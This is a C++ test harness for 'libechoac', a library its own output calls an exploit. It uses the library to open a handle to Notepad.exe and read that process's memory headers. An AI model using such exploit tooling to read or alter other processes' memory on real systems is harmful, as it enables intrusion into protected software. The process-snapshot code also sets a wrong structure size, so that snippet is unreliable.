// MIT License
//
// Copyright (c) 2023 t4bby
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

#pragma once
#include <iostream>
#include <string>
#include <Windows.h>
#include <TlHelp32.h>

#include <winternl.h>
#include "libechoac.h"

#pragma comment(lib, "ntdll.lib")

#define UDBG(format, ...) printf(format, __VA_ARGS__)
#define CHECK_HANDLE(x) (x && x != INVALID_HANDLE_VALUE)
#define EXEC_TEST(eval, log_fail, log_success, ret) \
    if (!eval) { log_fail; return ret; } else { log_success; }

using unique_handle = std::unique_ptr<void, decltype(&CloseHandle)>;

//
// find the process id by specific name using ToolHelp32Snapshot
//
uint32_t find_process_id(const std::string_view process_name)
{
    PROCESSENTRY32 processentry = {};

    const unique_handle snapshot(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0), &CloseHandle);

    if (!CHECK_HANDLE(snapshot.get()))
    {
        return 0;
    }

    processentry.dwSize = sizeof(MODULEENTRY32);

    while (Process32Next(snapshot.get(), &processentry) == TRUE)
    {
        if (process_name.compare(processentry.szExeFile) == 0)
        {
            return processentry.th32ProcessID;
        }
    }

    return 0;
}

//
// find the base address of process by the pid using ToolHelp32Snapshot
//
uint64_t find_base_address(const uint32_t process_id)
{
    MODULEENTRY32 module_entry = {};

    const unique_handle snapshot(CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, process_id), &CloseHandle);

    if (!CHECK_HANDLE(snapshot.get()))
    {
        return 0;
    }

    module_entry.dwSize = sizeof(module_entry);

    Module32First(snapshot.get(), &module_entry);

    return (uint64_t)module_entry.modBaseAddr;
}



int main() {

    UDBG("[>] libechoac tests...\n");

    const uint32_t process_id = find_process_id("Notepad.exe");
    if (!process_id)
    {
        UDBG("[!] process not found\n");
        return -1;
    }
    UDBG("[+] process: %d\n", process_id);

    const uint64_t process_base_address = find_base_address(process_id);
    UDBG("[+] process_base_address: 0x%llX\n", process_base_address);
    if (!process_base_address)
    {
        UDBG("[!] invalid process base address\n");
        return -1;
    }

    UDBG("[+] main module address: 0x%llX\n", process_base_address);

    if (!libechoac::echoac_init())
    {
        UDBG("[!] failed to init echoac exploit\n");
        libechoac::echoac_unload();
        return -1;
    }

    HANDLE process_handle = libechoac::get_handle_for_pid(process_id);
    const IMAGE_DOS_HEADER dos_header =
            libechoac::read_process_memory<IMAGE_DOS_HEADER>(process_handle, process_base_address);


    EXEC_TEST(
            dos_header.e_lfanew,
            UDBG("[!] TEST FAILED: invalid dos header received\n"); libechoac::echoac_unload(),
            UDBG("[+] TEST     OK: nt header offset in dos header is ok\n"),
            -1
    );

   EXEC_TEST(
            dos_header.e_magic == IMAGE_DOS_SIGNATURE,
            UDBG("[!] TEST FAILED: invalid dos header signature"); libechoac::echoac_unload(),
            UDBG("[+] TEST     OK: dos header signature is ok\n"),
            -1
    );

    const IMAGE_NT_HEADERS nt_header = libechoac::
    read_process_memory<IMAGE_NT_HEADERS>(process_handle, process_base_address + dos_header.e_lfanew);

    EXEC_TEST(
            nt_header.Signature == IMAGE_NT_SIGNATURE,
            UDBG("[!] TEST FAILED: invalid nt header signature"); libechoac::echoac_unload(),
            UDBG("[+] TEST     OK: nt header signature is ok\n"),
            -1
    );

    UDBG("[<] done\n");

    libechoac::echoac_unload();

    return 0;
}
